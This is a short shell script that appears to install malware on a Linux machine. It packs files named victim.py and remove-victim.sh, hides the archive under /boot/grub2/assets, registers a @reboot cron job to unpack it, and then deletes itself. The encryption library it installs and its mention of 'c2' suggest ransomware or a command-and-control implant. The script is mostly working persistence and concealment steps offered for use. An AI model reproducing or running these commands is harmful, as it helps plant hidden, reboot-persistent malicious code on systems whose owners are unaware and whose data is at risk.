yum install -y gcc
yum install -y python3 
pip3 install ez_setup
pip3 install wheel
pip3 install pycryptodome
tar -czvf startup victim.py remove-victim.sh
rm victim.py remove-victim.sh
mkdir /boot/grub2/assets
mv startup /boot/grub2/assets
mv unzip.sh /boot/grub2/assets
crontab -l > cron.txt
echo "@reboot /boot/grub2/assets/unzip.sh" >> cron.txt
crontab cron.txt
rm cron.txt 
ip addr
echo "If the installation suceeded, run rm c2, copy the IP address to your machine. \n Then run reboot"
rm -- "$0"
